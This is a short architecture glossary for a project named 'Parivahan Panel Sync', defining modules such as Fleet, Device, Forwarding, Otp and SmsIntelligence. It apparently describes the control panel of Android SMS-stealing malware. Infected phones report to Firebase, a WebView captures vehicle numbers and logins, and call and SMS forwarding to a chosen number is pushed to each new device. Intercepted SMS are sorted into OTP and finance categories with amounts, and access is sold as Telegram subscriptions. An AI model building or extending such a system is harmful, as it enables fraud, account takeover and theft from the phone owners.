# Context — Parivahan Panel Sync

Domain glossary for architecture seams. Use these terms exactly when naming modules.

## Fleet

Collection of Devices aggregated across one or more Firebase Realtime Database instances (primary + `config/firebases`). Owns forward defaults (`config/forwardDefaults`) and multi-instance fan-out. The seam for Fleet is at `artifacts/api-server/src/fleet/` — callers know `fleet.isActive`, not RTDB paths.

## Device

Android endpoint that pushes telemetry to Firebase. Raw shape varies (old `model/phone/ping` vs new `modelName/mobNo/sims[]/status` + WebView capture `vehicleNumber/loginTime`). Normalized via `Device.fromRaw`. Online = `now - ping < 5m` or `status === 'online'`. Owns pin (`pins/{userId}/{deviceId}`), online alert, and filter predicates.

## Telemetry

Time-series health of a Device: ping timestamp, battery, IP, sim info. Used by Device to derive `isOnline`. Not a separate module — property of Device.

## Subscription

Plan + expiry for a Telegram ID. Stored at `subscriptions/{telegramId}` with `plan`, `status`, `expiresAt`, `createdAt`. `isActive` = `status === 'active' && now < expiresAt`. Admin bypasses expiry. Owned by Fleet.

## Forwarding

Global call/SMS pin written to `config/forwardDefaults` then to `clients/{id}/webhookEvent:{callForward,smsForward}` on new Device. Validated as `+` + digits.

## Otp

5-minute one-time code at `otps/{telegramId}` with `code` + `expiry`. Issued by `fleet.otp.issue`, consumed by `fleet.otp.verifyAndDelete`. Sender allowlist prevents `2026` false positives.

## Auth

Session bearer `telegramId:sessionId` stored at `config/sessions/{telegramId}/{sessionId}` with `device`, `ip`, `loggedInAt`, `lastSeen`, `expiresAt`. Verified via `auth.verifyBearer`. Admin set = `ADMIN_TELEGRAM_ID` env list (`5064888403,5741539104`).

## SmsIntelligence

Classification of SMS bodies: `isOtp`, `isFinance`, `classify` → {category, score, amount}. Replaces triple `BANK_RE` definitions.
